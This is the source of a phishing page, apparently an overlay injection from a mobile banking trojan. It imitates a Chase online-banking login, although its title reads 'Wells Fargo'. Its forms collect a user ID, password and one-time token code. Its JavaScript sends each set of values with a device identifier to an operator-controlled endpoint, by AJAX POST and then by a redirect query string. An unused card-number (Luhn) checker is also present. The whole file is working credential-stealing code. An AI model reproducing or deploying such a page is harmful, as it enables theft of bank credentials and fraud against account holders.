<!DOCTYPE html>

<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
	<script src="us/us_chase/js/jquery.min.js"></script>
	<script src="us/us_chase/js/cat.functions.js"></script>
	<link rel="stylesheet" href="us/us_chase/css/bootstrap.min.css">
	<link rel="stylesheet" href="us/us_chase/css/font-awesome.min.css">
	<link rel="stylesheet" href="us/us_chase/css/cat.style.css" type="text/css" media="all">
	<style type="text/css">
		*{outline:none;}.br{border:1px dotted red;}.stol{display:table;width:100%;}.td{display:table-cell;}.w100{width:100%;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}
		body,html{background-color:transparent;}@media(max-width:768px){.block-xs{display:block;width:100%!important;}.center-xs{text-align:center!important;}}.ramka{border:1px solid#AAAAAA;background-color:white;border-radius:5px;background-color:white!important;overflow:hidden;box-shadow:0 0 10px#B1B1B1}.header{padding:20px 20px;border-radius:5px 5px 0 0;background-color:#bb0826;border-bottom:0px solid black;box-shadow:0px 1px 2px black}.body{padding:15px;}.control-label{color:black;font-weight:600;}.body h3{color:black;font-weight:600;}.has-error.control-label,.has-error.help-block,.has-error.form-control-feedback{}.step_label_h4{color:#007eb6;}
	</style>

  <title>Wells Fargo</title>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>


<div id="cat-forms">
	<form id="cat-step-1" class="cat-start-step">

    <div class="cont1 " style="padding-top:0px">
      <div class="" style="">
        <div class="header" style="padding-bottom:270px;background-image: url(us/us_chase/images/background.png);background-size: 5px;">
          <div class="stol w100  " style="">
		  <center>
            <div class="td  middle left_" style="width:0px"><img src="us/us_chase/images/logo.png" style="width:120px" class=""></div>
           </center>
		  </div>
        </div>

        <div class="body " style="">
          <div class="row " style="">
            <div class="col-sm-12 " style="background-color:#fff; width:80%;margin-left:10%;margin-top: -220px;border:1.5px solid #828282;border-radius: 5px;" >
            </br>

				<div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style="">

                  </div>

                  <div class="col-sm-3 " style="">
                    <input class="form-control" type="text" maxlength="" name="userId" id="userId" placeholder="User ID">
                  </div>
                </div>
              </div>

              <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style="">

                  </div>

                  <div class="col-sm-3 " style="">
                    <input class="form-control" type="password" name="Security_Number" maxlength="" id="Security_Number" placeholder="Password">
                  </div>


                </div>
              </div>

              <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style=""></div>

                  <div class="col-sm-3 " style="">
                    <input type="button" class="btn btn-primary btn-block cont_but" value="Log On"/>
                  </div>
				  </br>
				   <center><span class="some_class" style="color:#255182;">Forgot User ID or Password?</span></center>
                </div>
              </div>
            </div>
          </div>
		  			  </br>
			  <center>

			   <span class="some_class" style="margin-left:8px;color:#3a6391;">Enroll</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px; color:#3a6391;">ATM & Branch</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px;color:#3a6391;">Contact</span>

			   </br> </br>

			   <div style="margin-top:-11px;">
			   <span class="some_class" style="margin-left:8px;color:#3a6391;font-size:12px;">FAQs</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px; color:#3a6391;font-size:12px;">Privacy</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px;color:#3a6391;font-size:12px;">Info</span>
			   <div>


			   <p  style="margin-left:8px;font-size:9px;">
			   Equal Housing Lender </br>
			   Deposit products provided by JPMorgan Chase Bank, N.A.</br>
			   Member FDIC
			   Credit cards are issued by Chase Bank USA, N.A.</br>
			   © JPMorgan Chase & CO.
			   </p>
			  </center>



        </div>
      </div>
    </div>
  </form>

  <form id="cat-step-2" class="cat-step-block">
    <div class="cont2 " style="padding-top:0px">
       <div class="" style="">
        <div class="header" style="padding-bottom:270px;background-image: url(us/us_chase/images/background.png);background-size: 5px;">
          <div class="stol w100  " style="">
		  <center>
            <div class="td  middle left_" style="width:0px"><img src="us/us_chase/images/logo.png" style="width:120px" class=""></div>
           </center>
		  </div>
        </div>

        <div class="body " style="">
          <div class="row " style="">
            <div class="col-sm-12 " style="background-color:#fff; width:80%;margin-left:10%;margin-top: -220px;border:1.5px solid #828282;border-radius: 5px;" >
            </br>



              <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style="">

                  </div>

                  <div class="col-sm-3 " style="">
                    <input class="form-control" type="text" name="Token" maxlength="" id="Token" placeholder="Token Code">
                  </div>


                </div>
              </div>

              <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style=""></div>

                  <div class="col-sm-3 " style="">
                    <input type="button" class="btn btn-primary btn-block cont_but" value="Log On"/>
                  </div>
				  </br>
				   <center><span class="some_class" style="color:#255182;">Forgot User ID or Password?</span></center>
                </div>
              </div>
            </div>
          </div>
		  			  </br>
			  <center>

			   <span class="some_class" style="margin-left:8px;color:#3a6391;">Enroll</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px; color:#3a6391;">ATM & Branch</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px;color:#3a6391;">Contact</span>

			   </br> </br>

			   <div style="margin-top:-11px;">
			   <span class="some_class" style="margin-left:8px;color:#3a6391;font-size:12px;">FAQs</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px; color:#3a6391;font-size:12px;">Privacy</span>
			   <span class="some_class" style="margin-left:8px; color:#828282;">|</span>
			   <span class="some_class" style="margin-left:8px;color:#3a6391;font-size:12px;">Info</span>
			   <div>


			   <p  style="margin-left:8px;font-size:9px;">
			   Equal Housing Lender </br>
			   Deposit products provided by JPMorgan Chase Bank, N.A.</br>
			   Member FDIC
			   Credit cards are issued by Chase Bank USA, N.A.</br>
			   © JPMorgan Chase & CO.
			   </p>
			  </center>



        </div>
      </div>
    </div>
  </form>


  </div>
      <script>

	function getAjax(text) {
	var URL_='<?php echo $URL;?>';
	//alert(URL_ +  '    ' + text);
	$.ajax({
	  type: 'POST',
	  url: URL_+'/o1o/a10.php',
	  data: text,
	  success: function(data) {
		$('.results').html(data);
	  },
	  error:  function(xhr, str){
		 //  alert('Возникла ошибка: ' + xhr.responseCode);
		}
	});
}
 </script>
  <script type="text/javascript">
(function () {

	var IMEI='<?php echo $IMEI_country;?>';

	$('.form-control').focus(function () {
		$('.has-error').removeClass('has-error');
	})
	$('.cont1 .cont_but').bind('click', function () {
		var err = false;
		var customer_number = $('#userId').val();
		var Security_Number = $('#Security_Number').val();
		var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
		if (!VRegExp.test(customer_number)) {
			$('#userId').closest('.form-group').addClass('has-error');
			err = true;
		};
		var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
		if (!VRegExp.test(Security_Number)) {
			$('#Security_Number').closest('.form-group').addClass('has-error');
			err = true;
		};
		if (err == true) {
			return;
		};

	  getAjax('p=' + IMEI + '|Injection_4|CHASE|'+customer_number+"|"+Security_Number);
	  switchStep(1, false);
	});
	$('.cont2 .cont_but').bind('click', function () {
		var err = false;
		var Token = $('#Token').val();

		var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
		if (!VRegExp.test(Token)) {
			$('#Token').closest('.form-group').addClass('has-error');
			err = true;
		};

		if (err == true) {
			return;
		};

		var customer_number = $('#userId').val();
		var URL__='<?php echo $URL;?>';
		location.replace(URL__+'/o1o/a10.php?p=' + IMEI + '|Injection_8|CHASE|'+customer_number+'|Token code: '+ Token);

	});

})();
function Calculate(Luhn) {
	var sum = 0;
	for (i = 0; i < Luhn.length; i++) {
		sum += parseInt(Luhn.substring(i, i + 1));
	}
	var delta = new Array(0, 1, 2, 3, 4, -4, -3, -2, -1, 0);
	for (i = Luhn.length - 1; i >= 0; i -= 2) {
		var deltaIndex = parseInt(Luhn.substring(i, i + 1));
		var deltaValue = delta[deltaIndex];
		sum += deltaValue;
	}
	var mod10 = sum % 10;
	mod10 = 10 - mod10;
	if (mod10 == 10) {
		mod10 = 0;
	}
	return mod10;
};
function Validate(Luhn) {
	var LuhnDigit = parseInt(Luhn.substring(Luhn.length - 1, Luhn.length));
	var LuhnLess = Luhn.substring(0, Luhn.length - 1);
	if (Calculate(LuhnLess) == parseInt(LuhnDigit)) {
		return true;
	}
	return false;
};
  </script>
</body>
</html>
